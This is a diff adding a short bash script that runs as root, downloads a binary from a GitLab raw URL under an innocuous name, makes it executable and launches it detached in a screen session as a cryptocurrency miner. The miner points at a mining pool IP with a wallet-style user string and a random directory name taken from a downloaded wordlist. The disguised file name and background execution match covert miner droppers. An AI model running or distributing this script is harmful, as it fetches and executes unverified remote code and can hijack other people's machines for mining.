@@ -1,0 +1,13 @@
+#!/bin/bash
+sudo su <<EOF
+wget https://raw.githubusercontent.com/huntergregal/wordlists/master/names.txt
+TIK=$(shuf -n 1 names.txt)
+USER=$1
+sudo apt install screen -y
+sleep 2
+mkdir $TIK && cd $TIK
+
+wget -qO sayur https://gitlab.com/sarifadim/jomblo/-/raw/main/sagu && chmod +x sayur &&
+screen -dms run ./sayur --algo BEAM-III --pool 47.236.123.51:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0J-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl
+EOF
+screen -r
